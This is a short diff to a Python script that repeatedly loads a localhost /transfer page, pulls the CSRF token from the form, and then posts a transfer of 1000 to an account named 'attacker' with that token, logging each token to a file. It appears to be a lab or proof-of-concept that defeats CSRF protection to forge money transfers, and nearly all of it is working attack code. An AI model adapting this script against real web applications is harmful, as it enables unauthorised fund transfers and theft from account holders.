@@ -10,14 +10,17 @@ file=open("tokens", 'w')
 def start_token():
     global token
     while(True):
-        page=requests.get("http://localhost:60782/Account/Manage")
+        page=requests.get("http://localhost:5000/transfer")
         tree = html.fromstring(page.content)
-        token=page.headers["Set-Cookie"].split(';')[0].split('=')[1]
+        token=dict(tree.forms[0].inputs.items())["csrf_token"].value
         print("got token {}".format(token))
         file.write(token+'\r\n')
+        r=requests.post("http://localhost:5000/transfer", data={'transfer':'1000', 'to':'attacker', 'csrf_token':token})
+        print(r.text)
         #time.sleep(0.2)
 
 def main():
+
     start_token()
 
 if __name__=="__main__":
